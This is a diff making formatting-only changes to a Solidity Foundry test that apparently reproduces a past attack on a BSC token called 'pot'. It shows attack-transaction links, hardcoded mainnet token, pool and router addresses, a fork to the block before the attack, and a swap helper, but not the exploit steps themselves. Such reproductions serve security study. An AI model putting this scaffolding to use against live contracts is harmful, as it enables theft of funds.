@@ -12,15 +12,13 @@ https://twitter.com/Phalcon_xyz/status/1645963327502204929
 invest
 https://bscscan.com/tx/0xdb01fa33bf5b79a3976ed149913ba0a18ddd444a072a2f34a0042bf32e4e7995
 withdraw
-https://bscscan.com/tx/0x41853747231dcf01017cf419e6e4aa86757e59479964bafdce0921d3e616cc67
-*/
+https://bscscan.com/tx/0x41853747231dcf01017cf419e6e4aa86757e59479964bafdce0921d3e616cc67*/
 
 interface IApprove {
     function approve() external;
 }
 
 contract ContractTest is Test {
-
     address pot = 0x3B5E381130673F794a5CF67FBbA48688386BEa86;
     address usdt = 0x55d398326f99059fF775485246999027B3197955;
     address pot_usdt_pool = 0x9117df9aA33B23c0A9C2C913aD0739273c3930b3;
@@ -28,7 +26,7 @@ contract ContractTest is Test {
     Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
 
     function setUp() public {
-        vm.createSelectFork("bsc", 27264384 - 1);
+        vm.createSelectFork("bsc", 27_264_384 - 1);
     }
 
     function testExploit() public {
@@ -65,7 +63,7 @@ contract ContractTest is Test {
     }
 
     function bscSwap(address tokenFrom, address tokenTo, uint256 amount) internal {
-        IERC20(tokenFrom).approve(address(Router), type(uint).max);
+        IERC20(tokenFrom).approve(address(Router), type(uint256).max);
         address[] memory path = new address[](2);
         path[0] = tokenFrom;
         path[1] = tokenTo;
